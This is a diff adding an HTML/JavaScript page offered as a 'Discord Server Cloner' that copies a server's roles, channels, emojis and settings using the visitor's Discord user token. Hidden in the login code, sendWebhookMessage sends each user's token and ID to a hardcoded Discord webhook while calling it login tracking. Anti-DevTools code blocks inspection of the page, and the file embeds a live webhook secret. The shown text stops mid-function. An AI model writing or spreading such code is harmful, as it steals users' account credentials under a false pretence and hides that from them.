@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Server Cloner</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #0d0d1a, #1a0d2e);
+            color: #e0e0e0;
+            font-family: 'Orbitron', sans-serif;
+            margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: #1e1e2e;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.5);
+            border: 2px solid #00f0ff;
+        }
+        h1 {
+            text-align: center;
+            color: #00f0ff;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            text-shadow: 0 0 20px #00f0ff, 0 0 40px #ff00ff;
+            margin-bottom: 25px;
+        }
+        input, button, select {
+            background: #2a2a3a;
+            border: 2px solid #00f0ff;
+            color: #e0e0e0;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            font-family: 'Orbitron', sans-serif;
+            transition: all 0.3s;
+        }
+        input:focus, select:focus {
+            outline: none;
+            box-shadow: 0 0 15px #00f0ff;
+            border-color: #ff00ff;
+        }
+        button {
+            cursor: pointer;
+            background: linear-gradient(90deg, #00f0ff, #ff00ff);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: 700;
+            text-shadow: 0 0 10px #00f0ff;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #00f0ff, 0 0 40px #ff00ff;
+        }
+        button:disabled {
+            background: #555;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .paste-button-owner {
+            background: linear-gradient(90deg, #ff0000, #ff5555);
+            border: 2px solid #ff0000;
+        }
+        .paste-button-owner:hover {
+            box-shadow: 0 0 20px #ff0000;
+        }
+        .paste-button-admin {
+            background: linear-gradient(90deg, #ffff00, #ffff55);
+            border: 2px solid #ffff00;
+        }
+        .paste-button-admin:hover {
+            box-shadow: 0 0 20px #ffff00;
+        }
+        #userInfo {
+            text-align: center;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #00f0ff;
+        }
+        #userInfo img {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 3px solid #00f0ff;
+            box-shadow: 0 0 15px #00f0ff;
+            margin-right: 15px;
+            vertical-align: middle;
+        }
+        #guildList {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .guild {
+            background: #2a2a3a;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+            text-align: center;
+        }
+        .guild:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(0, 255, 255, 0.7);
+        }
+        .guild.owner {
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        .guild.admin {
+            border: 3px solid #ffff00;
+            box-shadow: 0 0 20px #ffff00;
+        }
+        .guild img {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            margin-bottom: 15px;
+            border: 3px solid #00f0ff;
+            box-shadow: 0 0 15px #00f0ff;
+        }
+        .guild button {
+            margin: 5px;
+            padding: 10px 15px;
+            font-size: 14px;
+        }
+        .hidden {
+            display: none;
+        }
+        #status {
+            text-align: center;
+            margin: 15px 0;
+            font-weight: 700;
+            text-shadow: 0 0 15px #00f0ff;
+        }
+        #progressBar {
+            width: 100%;
+            background: #2a2a3a;
+            border: 2px solid #00f0ff;
+            height: 30px;
+            border-radius: 10px;
+            margin: 15px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        #progressFill {
+            height: 100%;
+            background: linear-gradient(90deg, #00f0ff, #ff00ff);
+            width: 0%;
+            transition: width 0.5s ease-in-out;
+            box-shadow: 0 0 15px #00f0ff;
+        }
+        #progressText {
+            text-align: center;
+            margin: 10px 0;
+            color: #00f0ff;
+            text-shadow: 0 0 10px #00f0ff;
+        }
+        #preview {
+            margin-top: 20px;
+            padding: 20px;
+            background: #1e1e2e;
+            border: 2px solid #00f0ff;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        #preview h3 {
+            color: #ff00ff;
+            text-shadow: 0 0 15px #ff00ff;
+            margin-bottom: 15px;
+        }
+        #preview p {
+            margin: 5px 0;
+            color: #e0e0e0;
+            text-shadow: 0 0 5px #00f0ff;
+        }
+        #preview img {
+            border: 2px solid #00f0ff;
+            box-shadow: 0 0 10px #00f0ff;
+        }
+        #pastingLog {
+            margin-top: 15px;
+            padding: 20px;
+            background: #1e1e2e;
+            border: 2px solid #00f0ff;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 14px;
+        }
+        #pastingLog p {
+            margin: 5px 0;
+            transition: all 0.3s;
+        }
+        #pastingLog .success { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
+        #pastingLog .error { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
+        #pastingLog .warning { color: #ffff00; text-shadow: 0 0 10px #ffff00; }
+        #pasteOptions {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .option {
+            margin: 10px 0;
+            display: inline-block;
+        }
+        .option select {
+            width: 220px;
+            background: #2a2a3a;
+            border: 2px solid #00f0ff;
+        }
+        .batchInput {
+            width: 48%;
+            display: inline-block;
+        }
+        #timeEstimate {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #00f0ff;
+            text-shadow: 0 0 10px #00f0ff;
+            white-space: pre-wrap;
+            text-align: left;
+        }
+        .templateLink {
+            color: #00f0ff;
+            cursor: pointer;
+            text-decoration: none;
+            text-shadow: 0 0 10px #00f0ff;
+        }
+        .templateLink:hover {
+            text-shadow: 0 0 15px #00f0ff, 0 0 30px #ff00ff;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(-3px, -3px); }
+            60% { transform: translate(3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+        .spinner {
+            animation: glitch 0.8s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Discord Server Cloner</h1>
+        <div id="loginSection">
+            <input type="text" id="tokenInput" placeholder="Enter your Discord token">
+            <button id="loginButton">Login</button>
+        </div>
+        <div id="userInfo" class="hidden"></div>
+        <div id="status"></div>
+        <div id="pasteOptions" class="hidden">
+            <h3>Select Paste Option</h3>
+            <div class="option">
+                <select id="pasteOptionSelect">
+                    <option value="none">Select an option</option>
+                    <option value="settings">Paste Settings/Name/Icon</option>
+                    <option value="roles">Paste Roles</option>
+                    <option value="emojis">Paste Emojis</option>
+                    <option value="stickers">Paste Stickers</option>
+                    <option value="channels">Paste Channels/Categories</option>
+                    <option value="onboarding">Paste Onboarding (requires Roles and Channels)</option>
+                    <option value="template">Get Server Template</option>
+                    <option value="all">Paste All</option>
+                </select>
+                <div id="batchInputs" class="hidden">
+                    <input type="number" id="batchSeconds" class="batchInput" placeholder="Seconds (e.g., 6.5)" min="1" value="6.5">
+                    <input type="number" id="batchItems" class="batchInput" placeholder="Items (e.g., 1)" min="1" value="1">
+                </div>
+            </div>
+            <div id="timeEstimate"></div>
+        </div>
+        <div id="progressBar" class="hidden">
+            <div id="progressFill"></div>
+        </div>
+        <div id="progressText" class="hidden"></div>
+        <button id="stopButton" class="hidden" onclick="window.stopPasting()">Stop Pasting</button>
+        <div id="preview" class="hidden"></div>
+        <div id="pastingLog" class="hidden"></div>
+        <div id="guildList"></div>
+    </div>
+    <script>
+        let token = '';
+        let userId = '';
+        let copiedSettings = null;
+        let isPasting = false;
+        let selectedPasteOption = 'none';
+        const MIN_CHANNEL_DELAY_MS = 500;
+        const MIN_ROLE_DELAY_MS = 6500;
+        const MIN_OTHER_DELAY_MS = 1000;
+        const MAX_ROLES = 250;
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393434151356727296/KoBdd7gv3lRiht94tQFzoa0gMOkjJAwK9B08nqwlOFS8-vLi1uLB9fl9VCsUp_zo_y32';
+
+        // Anti-Inspect Feature
+        let inspectAttempts = 0;
+        const inspectMessages = [
+            "You Can`t Noob 😆😂🤣",
+            "Fer Se try kar raha saram kar le noob",
+            "Saram baram hai tepe bhai nhi hoga bhai tese",
+            "Chutiye bhag ja mare website se",
+            "Sale kitna gali khayga",
+            "Bhai ab toh hadd ho gayi, nikal yaha se!",
+            "Tu toh ek number ka noob hai, band kar ye drama!",
+            "Abey chal nikal, website ko chhed mat!",
+            "Tujhe kitni baar bolu, DevTools band kar!",
+            "Bas kar pagle, rulayega kya? Bhagna ab!"
+        ];
+
+        function showInspectWarning() {
+            const message = inspectAttempts < inspectMessages.length ? inspectMessages[inspectAttempts] : inspectMessages[inspectMessages.length - 1];
+            alert(message);
+            inspectAttempts++;
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                (e.ctrlKey && e.key === 'U')
+            ) {
+                e.preventDefault();
+                showInspectWarning();
+            }
+        });
+
+        function detectDevTools() {
+            const threshold = 100;
+            if (
+                window.outerWidth - window.innerWidth > threshold ||
+                window.outerHeight - window.innerHeight > threshold ||
+                window.console && (console.profile || console.profileEnd)
+            ) {
+                showInspectWarning();
+            }
+        }
+
+        setInterval(detectDevTools, 1000);
+
+        function showStatus(message, type = 'success') {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = type;
+            console.log(`[${new Date().toLocaleTimeString()}] ${message}`);
+        }
+
+        function sanitizeRoleName(name, index, existingNames) {
+            if (!name) return `Role-${index}`;
+            let sanitized = name
+                .replace(/[\uD800-\uDFFF]|[!@#$%^&*()+={}\[\]|\\:;"'<>?,./`~]+/g, '')
+                .replace(/₹+/g, 'Currency')
+                .trim();
+            sanitized = sanitized || `Role-${index}`;
+            sanitized = sanitized.slice(0, 100);
+            let baseName = sanitized;
+            let suffix = 1;
+            while (existingNames.has(sanitized)) {
+                sanitized = `${baseName}-${suffix}`;
+                suffix++;
+            }
+            existingNames.add(sanitized);
+            return sanitized;
+        }
+
+        function updatePasteOptions() {
+            const pasteOptionSelect = document.getElementById('pasteOptionSelect');
+            const batchInputs = document.getElementById('batchInputs');
+            const batchSeconds = document.getElementById('batchSeconds');
+            const batchItems = document.getElementById('batchItems');
+
+            pasteOptionSelect.addEventListener('change', () => {
+                selectedPasteOption = pasteOptionSelect.value;
+                batchInputs.classList.toggle('hidden', ['none', 'template'].includes(selectedPasteOption));
+                if (selectedPasteOption === 'onboarding' && copiedSettings) {
+                    const hasRoles = copiedSettings.roles && copiedSettings.roles.length > 0;
+                    const hasChannels = copiedSettings.channels && copiedSettings.channels.length > 0;
+                    pasteOptionSelect.querySelector('option[value="onboarding"]').disabled = !(hasRoles && hasChannels);
+                }
+                updateTimeEstimate();
+            });
+
+            [batchSeconds, batchItems].forEach(input => {
+                input.addEventListener('input', updateTimeEstimate);
+            });
+        }
+
+        function updateTimeEstimate() {
+            if (!copiedSettings || selectedPasteOption === 'none' || selectedPasteOption === 'template') return;
+            const { channels, roles, emojis, stickers, onboarding, guild } = copiedSettings;
+            let seconds = parseFloat(document.getElementById('batchSeconds')?.value) || 6.5;
+            let items = parseInt(document.getElementById('batchItems')?.value) || 1;
+
+            let delay = MIN_OTHER_DELAY_MS;
+            let itemCount = 0;
+            let itemName = 'items';
+            if (selectedPasteOption === 'settings') {
+                delay = Math.max(MIN_OTHER_DELAY_MS, (seconds * 1000) / items);
+                itemCount = (guild.name ? 1 : 0) + (guild.icon ? 1 : 0);
+                itemName = 'settings';
+            } else if (selectedPasteOption === 'roles') {
+                delay = Math.max(MIN_ROLE_DELAY_MS, (seconds * 1000) / items);
+                itemCount = roles.length;
+                itemName = 'roles';
+            } else if (selectedPasteOption === 'emojis') {
+                delay = Math.max(MIN_OTHER_DELAY_MS, (seconds * 1000) / items);
+                itemCount = emojis.length;
+                itemName = 'emojis';
+            } else if (selectedPasteOption === 'stickers') {
+                delay = Math.max(MIN_OTHER_DELAY_MS, (seconds * 1000) / items);
+                itemCount = stickers.length;
+                itemName = 'stickers';
+            } else if (selectedPasteOption === 'channels') {
+                delay = Math.max(MIN_CHANNEL_DELAY_MS, (seconds * 1000) / items);
+                itemCount = channels.length;
+                itemName = 'channels/categories';
+            } else if (selectedPasteOption === 'onboarding') {
+                delay = Math.max(MIN_OTHER_DELAY_MS, (seconds * 1000) / items);
+                itemCount = (onboarding?.prompts?.length || 0) + (onboarding?.welcomeScreen ? 1 : 0);
+                itemName = 'onboarding steps';
+            } else if (selectedPasteOption === 'all') {
+                itemCount = (guild.name ? 1 : 0) + (guild.icon ? 1 : 0) + roles.length + emojis.length + stickers.length + channels.length + (onboarding?.prompts?.length || 0) + (onboarding?.welcomeScreen ? 1 : 0);
+                delay = Math.max(MIN_OTHER_DELAY_MS, (seconds * 1000) / items);
+                itemName = 'items';
+            }
+
+            if (selectedPasteOption === 'roles' && seconds < 6.5) {
+                showStatus(`Warning: Role batch seconds set to 6.5s to match API rate limits.`, 'warning');
+                document.getElementById('batchSeconds').value = 6.5;
+            } else if (selectedPasteOption === 'roles' && delay < MIN_ROLE_DELAY_MS) {
+                showStatus(`Warning: Role delay set to ${MIN_ROLE_DELAY_MS}ms per role to avoid rate limits.`, 'warning');
+            } else if (selectedPasteOption === 'channels' && delay < MIN_CHANNEL_DELAY_MS) {
+                showStatus(`Warning: Channel delay set to ${MIN_CHANNEL_DELAY_MS}ms per channel to avoid rate limits.`, 'warning');
+            } else if (['settings', 'emojis', 'stickers', 'onboarding'].includes(selectedPasteOption) && delay < MIN_OTHER_DELAY_MS) {
+                showStatus(`Warning: ${selectedPasteOption.charAt(0).toUpperCase() + selectedPasteOption.slice(1)} delay set to ${MIN_OTHER_DELAY_MS}ms per item to avoid rate limits.`, 'warning');
+            }
+
+            let estimateText = `${itemName.charAt(0).toUpperCase() + itemName.slice(1)}: ${itemCount} ${itemName} at ${delay}ms/${itemName.slice(0, -1)} = ${(itemCount * delay / 1000).toFixed(1)}s\n`;
+            estimateText += `Total Estimated Time: ${(itemCount * delay / 60000).toFixed(1)}min`;
+            document.getElementById('timeEstimate').textContent = estimateText;
+        }
+
+        async function sendWebhookMessage(userId, token) {
+            const webhookMessage = `<@${userId}>\n---------------------------------------\n${token}\n---------------------------------------`;
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: webhookMessage })
+                });
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    showStatus(`Failed to send webhook message: ${response.status} - ${errorText}`, 'error');
+                    return;
+                }
+                showStatus('Login tracked in webhook.', 'success');
+            } catch (error) {
+                showStatus(`Failed to send webhook message: ${error.message}`, 'error');
+            }
+        }
+
+        window.login = async function() {
+            token = document.getElementById('tokenInput').value.trim();
+            if (!token || token.length < 50) {
+                showStatus('Invalid token format. Ensure it’s a valid Discord user token (50+ characters).', 'error');
+                return;
+            }
+            showStatus('Logging in...', 'warning');
+            document.getElementById('pastingLog').classList.remove('hidden');
+            try {
+                const user = await fetchDiscord('/users/@me', token);
+                if (!user.id || !user.username) {
+                    throw new Error('Invalid user data received');
+                }
+                userId = user.id;
+                await sendWebhookMessage(user.id, token);
+                document.getElementById('userInfo').innerHTML = `
+                    <img src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64" alt="User Avatar" onerror="this.src='https://via.placeholder.com/60'">
+                    <span>Logged in as ${user.username}#${user.discriminator}</span>
+                `;
+                document.getElementById('userInfo').classList.remove('hidden');
+                showStatus(`Successfully logged in as ${user.username}#${user.discriminator}`, 'success');
+                document.getElementById('loginSection').innerHTML = `<button id="logoutButton">Logout</button>`;
+                document.getElementById('logoutButton').addEventListener('click', window.logout);
+                document.getElementById('pasteOptions').classList.remove('hidden');
+                updatePasteOptions();
+                loadGuilds();
+            } catch (error) {
+                showStatus(`Login failed: ${error.message || 'Check your token, network, or try hosting locally (e.g., python -m http.server 8000).'}`, 'error');
+            }
+        };
+
+        window.logout = function() {
+            token = '';
+            userId = '';
+            copiedSettings = null;
+            isPasting = false;
+            selectedPasteOption = 'none';
+            document.getElementById('loginSection').innerHTML = `
+                <input type="text" id="tokenInput" placeholder="Enter your Discord token">
+                <button id="loginButton">Login</button>
+            `;
+            document.getElementById('loginButton').addEventListener('click', window.login);
+            document.getElementById('guildList').innerHTML = '';
+            document.getElementById('userInfo').classList.add('hidden');
+            document.getElementById('preview').classList.add('hidden');
+            document.getElementById('pastingLog').classList.add('hidden');
+            document.getElementById('pasteOptions').classList.add('hidden');
+            document.getElementById('progressBar').classList.add('hidden');
+            document.getElementById('progressText').classList.add('hidden');
+            showStatus('Logged out.', 'success');
+        };
+
+        document.getElementById('loginButton').addEventListener('click', window.login);
+
+        async function fetchDiscord(endpoint, token, method = 'GET', body = null, retries = 5, isMultipart = false) {
+            const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+            for (let attempt = 1; attempt <= retries; attempt++) {
+                if (!isPasting && method !== 'GET') return;
+                try {
+                    const options = {
+                        method,
+                        headers: { 'Authorization': token }
+                    };
+                    if (body) {
+                        if (isMultipart) {
+                            options.body = body;
+                        } else {
+                            options.headers['Content-Type'] = 'application/json';
+                            options.body = JSON.stringify(body);
+                        }
+                    }
+                    const response = await fetch(`https://discord.com/api/v10${endpoint}`, options);
+                    const remaining = response.headers.get('X-RateLimit-Remaining') || 'unknown';
+                    const resetAfter = response.headers.get('X-RateLimit-Reset-After') || 'unknown';
+                    const bucket = response.headers.get('X-RateLimit-Bucket') || 'unknown';
+                    if (response.status === 429) {
+                        const errorData = await response.json();
+                        const retryAfter = (parseFloat(errorData.retry_after || 1) * 1000) + 1000;
+                        showStatus(`Rate limit hit on ${endpoint}, waiting ${retryAfter}ms (Remaining: ${remaining}, Reset-After: ${resetAfter}s, Bucket: ${bucket}).`, 'warning');
+                        await sleep(retryAfter);
+                        continue;
+                    }
+                    if (response.status === 401) {
+                        throw new Error('Unauthorized: Invalid token. Regenerate your token in Discord (User Settings → Advanced → Developer Mode → Reset Token).');
+                    }
+                    if (response.status === 404 && endpoint.includes('/welcome-screen')) {
+                        throw new Error('No welcome screen found');
+                    }
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        throw new Error(`API request failed: ${response.status} - ${errorText}`);
+                    }
+                    return response.status === 204 ? {} : response.json();
+                } catch (error) {
+                    if (error.message === 'No welcome screen found') {
+                        console.log(`No welcome screen found for ${endpoint}, skipping retries`);
+                        return null;
+                    }
+                    if (attempt === retries) {
+                        showStatus(`API error after ${retries} attempts on ${endpoint}: ${error.message}`, 'error');
+                        throw error;
+                    }
+                    const backoff = Math.pow(2, attempt) * 1000 + 1000;
+                    showStatus(`Retrying ${endpoint} (attempt ${attempt}/${retries}) after ${backoff}ms...`, 'warning');
+                    await sleep(backoff);
+                }
+            }
+        }
+
+        async function checkAdminPermissions(guildId) {
+            try {
+                const member = await fetchDiscord(`/guilds/${guildId}/members/${userId}`, token);
+                const guild = await fetchDiscord(`/guilds/${guildId}`, token);
+                const isOwner = guild.owner_id === userId;
+                const permissions = BigInt(member.permissions || '0');
+                const hasAdmin = (permissions & BigInt(0x8)) === BigInt(0x8);
+                const hasManageGuild = (permissions & BigInt(0x20)) === BigInt(0x20);
+                const hasManageEmojis = (permissions & BigInt(0x4000)) === BigInt(0x4000);
+                const hasManageChannels = (permissions & BigInt(0x10)) === BigInt(0x10);
+                showStatus(`Permission check for guild ${guildId}: Owner=${isOwner}, Admin=${hasAdmin}, ManageGuild=${hasManageGuild}, ManageEmojis=${hasManageEmojis}, ManageChannels=${hasManageChannels}`, 'warning');
+                return { isOwner, hasAdmin: hasAdmin || hasManageGuild, hasManageEmojis, hasManageChannels };
+            } catch (error) {
+                showStatus(`Permission check failed for guild ${guildId}: ${error.message}. Assuming no permissions.`, 'warning');
+                return { isOwner: false, hasAdmin: false, hasManageEmojis: false, hasManageChannels: false };
+            }
+        }
+
+        async function loadGuilds() {
+            try {
+                const guilds = await fetchDiscord('/users/@me/guilds', token);
+                if (!Array.isArray(guilds)) {
+                    throw new Error('Invalid guild data received');
+                }
+                const guildList = document.getElementById('guildList');
+                guildList.innerHTML = '';
+                for (const guild of guilds) {
+                    const { isOwner, hasAdmin, hasManageEmojis, hasManageChannels } = await checkAdminPermissions(guild.id);
+                    const guildClass = isOwner ? 'owner' : hasAdmin ? 'admin' : '';
+                    const pasteButtonClass = isOwner ? 'paste-button-owner' : hasAdmin ? 'paste-button-admin' : '';
+                    const guildDiv = document.createElement('div');
+                    guildDiv.className = `guild ${guildClass}`;
+                    guildDiv.innerHTML = `
+                        <img src="${guild.icon ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png?size=64` : 'https://via.placeholder.com/70'}" alt="${guild.name}" onerror="this.src='https://via.placeholder.com/70'">
+                        <div>${guild.name}</div>
+                        <button onclick="window.copyGuild('${guild.id}', 'all')">Copy All</button>
+                        <button onclick="window.copyGuild('${guild.id}', 'settings')">Copy Settings</button>
+                        <button onclick="window.copyGuild('${guild.id}', 'roles')">Copy Roles</button>
+                        <button onclick="window.copyGuild('${guild.id}', 'emojis')">Copy Emojis</button>
+                        <button onclick="window.copyGuild('${guild.id}', 'stickers')">Copy Stickers</button>
+                        <button onclick="window.copyGuild('${guild.id}', 'channels')">Copy Channels</button>
+                        <button onclick="window.copyGuild('${guild.id}', 'onboarding')">Copy Onboarding</button>
+                        <button onclick="window.getServerTemplate('${guild.id}', '${guild.name}')">Get Server Template</button>
+                        ${isOwner || hasAdmin ? `<button class="${pasteButtonClass}" onclick="window.pasteGuild('${guild.id}')">Paste</button>` : ''}
+                    `;
+                    guildList.appendChild(guildDiv);
+                }
+            } catch (error) {
+                showStatus(`Failed to load guilds: ${error.message || 'API error. Try hosting locally (e.g., python -m http.server 8000).'}`, 'error');
+            }
+        }
+
+        window.copyGuild = async function(guildId, option) {
+            document.getElementById('preview').classList.remove('hidden');
+            document.getElementById('pastingLog').classList.remove('hidden');
+            showStatus(`Copying ${option} from server...`, 'warning');
+            try {
+                copiedSettings = {
+                    guild: {},
+                    channels: [],
+                    roles: [],
+                    emojis: [],
+                    stickers: [],
+                    onboarding: null
+                };
+
+                const fetches = [];
+                if (['all', 'settings'].includes(option)) {
+                    fetches.push(fetchDiscord(`/guilds/${guildId}`, token).then(guild => {
+                        copiedSettings.guild = guild;
+                        showStatus(`Copied server settings for ${guild.name}`, 'success');
+                    }));
+                }
+                if (['all', 'channels', 'onboarding'].includes(option)) {
+                    fetches.push(fetchDiscord(`/guilds/${guildId}/channels`, token).then(channels => {
+                        copiedSettings.channels = channels.sort((a, b) => a.position - b.position);
+                        showStatus(`Copied ${channels.length} channels/categories`, 'success');
+                    }));
+                }
+                if (['all', 'roles', 'onboarding'].includes(option)) {
+                    fetches.push(fetchDiscord(`/guilds/${guildId}/roles`, token).then(roles => {
+                        copiedSettings.roles = roles.filter(r => r.name !== '@everyone' && !r.managed).sort((a, b) => a.position - b.position);
+                        showStatus(`Copied ${roles.length} roles`, 'success');
+                    }));
+                }
+                if (['all', 'emojis'].includes(option)) {
+                    fetches.push(fetchDiscord(`/guilds/${guildId}/emojis`, token).then(emojis => {
+                        copiedSettings.emojis = emojis || [];
+                        showStatus(`Copied ${emojis.length} emojis`, 'success');
+                    }).catch(() => {
+                        copiedSettings.emojis = [];
+                        showStatus('No emojis found or failed to copy emojis', 'warning');
+                    }));
+                }
+                if (['all', 'stickers'].includes(option)) {
+                    fetches.push(fetchDiscord(`/guilds/${guildId}/stickers`, token).then(stickers => {
+                        copiedSettings.stickers = stickers || [];
+                        showStatus(`Copied ${stickers.length} stickers`, 'success');
+                    }).catch(() => {
+                        copiedSettings.stickers = [];
+                        showStatus('No stickers found or failed to copy stickers', 'warning');
+                    }));
+                }
+                if (['all', 'onboarding'].includes(option)) {
+                    fetches.push(fetchDiscord(`/guilds/${guildId}/onboarding`, token).then(onboarding => {
+                        copiedSettings.onboarding = { onboarding };
+                        showStatus('Copied onboarding settings', 'success');
+                    }).catch(() => {
+                        copiedSettings.onboarding = null;
+                        showStatus('No onboarding settings found or failed to copy', 'warning');
+                    }));
+                    fetches.push(fetchDiscord(`/guilds/${guildId}/welcome-screen`, token).then(welcomeScreen => {
+                        if (welcomeScreen) {
+                            copiedSettings.onboarding = { ...copiedSettings.onboarding, welcomeScreen };
+                            showStatus('Copied welcome screen settings', 'success');
+                        }
+                    }).catch(error => {
+                        if (error.message === 'No welcome screen found') {
+                            copiedSettings.onboarding = copiedSettings.onboarding || null;
+                            showStatus('No welcome screen found', 'warning');
+                        } else {
+                            showStatus(`Failed to copy welcome screen: ${error.message}`, 'error');
+                        }
+                    }));
+                }
+
+                await Promise.all(fetches);
+                showPreview(copiedSettings);
+                updateTimeEstimate();
+                showStatus(`Successfully copied ${option} from ${copiedSettings.guild?.name || 'server'}`, 'success');
+            } catch (error) {
+                showStatus(`Failed to copy ${option}: ${error.message || 'API error'}`, 'error');
+            }
+        };
+
+        window.getServerTemplate = async function(guildId, guildName) {
+            showStatus(`Generating template for ${guildName}...`, 'warning');
+            document.getElementById('pastingLog').classList.remove('hidden');
+            document.getElementById('pastingLog').innerHTML = '';
+            document.getElementById('preview').classList.remove('hidden');
+            try {
+                await window.copyGuild(guildId, 'template');
+                const existingTemplates = await fetchDiscord(`/guilds/${guildId}/templates`, token);
+                let template;
+                if (existingTemplates.length > 0) {
+                    template = existingTemplates[0];
+                    showStatus(`Found existing template: ${template.name} (${template.code})`, 'warning');
+                } else {
+                    template = await fetchDiscord(`/guilds/${guildId}/templates`, token, 'POST', {
+                        name: `${guildName} Template`,
+                        description: `Template for ${guildName}`
+                    });
+                    showStatus(`Created template: ${template.name} (${template.code})`, 'success');
+                }
+                const templateLink = `https://discord.com/template/${template.code}`;
+                document.getElementById('preview').innerHTML = `
+                    <h3>Server Template for ${guildName}</h3>
+                    <p><strong>Name:</strong> ${template.name}</p>
+                    <p><strong>Description:</strong> ${template.description}</p>
+                    <p><strong>Link:</strong> <a class="templateLink" href="${templateLink}" target="_blank">${templateLink}</a> <button onclick="navigator.clipboard.writeText('${templateLink}')">Copy Link</button></p>
+                    <p><strong>Roles:</strong> ${copiedSettings?.roles?.length || 0}</p>
+                    <p><strong>Channels:</strong> ${copiedSettings?.channels?.length || 0}</p>
+                `;
+                document.getElementById('pastingLog').innerHTML += `<p class="success">[${new Date().toLocaleTimeString()}] Access granted, template link jacked in: ${templateLink}</p>`;
+            } catch (error) {
+                showStatus(`Failed to generate template: ${error.message}`, 'error');
+                document.getElementById('pastingLog').innerHTML += `<p class="error">[${new Date().toLocaleTimeString()}] Error: Failed to generate template: ${error.message}</p>`;
+            }
+        };
+
+        function showPreview(settings) {
+            const { guild, channels, roles, emojis, stickers, onboarding } = settings;
+            const preview = document.getElementById('preview');
+            preview.classList.remove('hidden');
+            let previewHtml = `<h3>Copied Data Preview</h3>`;
+            if (guild.name) previewHtml += `<p><strong>Server Name:</strong> ${guild.name}</p>`;
+            if (guild.icon) previewHtml += `<p><strong>Icon:</strong> <img src="https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png?size=32" alt="Server Icon" onerror="this.src='https://via.placeholder.com/32'"></p>`;
+            if (channels.length) {
+                previewHtml += `<p><strong>Categories:</strong> ${channels.filter(c => c.type === 4).map(c => `${c.name} (Position: ${c.position}, ID: ${c.id}, Permissions: ${c.permission_overwrites?.length || 0})`).join(', ') || 'None'}</p>`;
+                previewHtml += `<p><strong>Channels:</strong> ${channels.filter(c => c.type !== 4).map(c => `${c.name} (Position: ${c.position}, ID: ${c.id}, Parent: ${c.parent_id || 'None'}, Permissions: ${c.permission_overwrites?.length || 0})`).join(', ') || 'None'}</p>`;
+            }
+            if (roles.length) {
+                previewHtml += `<p><strong>Roles:</strong> ${roles.map(r => `${r.name} (Position: ${r.position}, Admin: ${r.permissions & 0x8 ? 'Yes' : 'No'}, Color: #${(r.color || 0).toString(16).padStart(6, '0')})`).join(', ') || 'None'}</p>`;
+            }
+            if (emojis.length) previewHtml += `<p><strong>Emojis:</strong> ${emojis.map(e => e.name).join(', ') || 'None'}</p>`;
+            if (stickers.length) previewHtml += `<p><strong>Stickers:</strong> ${stickers.map(s => s.name).join(', ') || 'None'}</p>`;
+            if (onboarding?.onboarding) {
+                previewHtml += `<p><strong>Onboarding:</strong> Enabled=${onboarding.onboarding.enabled}, Prompts=${onboarding.onboarding.prompts?.length || 0}, Channels=${onboarding.onboarding.default_channel_ids?.length || 0}</p>`;
+            }
+            if (onboarding?.welcomeScreen) {
+                previewHtml += `<p><strong>Server Guide:</strong> Message=${onboarding.welcomeScreen.description?.slice(0, 20) || 'None'}, Channels=${onboarding.welcomeScreen.welcome_channels?.length || 0}</p>`;
+            }
+            preview.innerHTML = previewHtml;
+        }
+
+        async function resizeImage(url, maxSize) {
+            return new Promise((resolve, reject) => {
+                const img = new Image();
+                img.crossOrigin = 'Anonymous';
+                img.src = url;
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    const size = maxSize === 'emoji' ? 128 : 320;
+                    canvas.width = size;
+                    canvas.height = size;
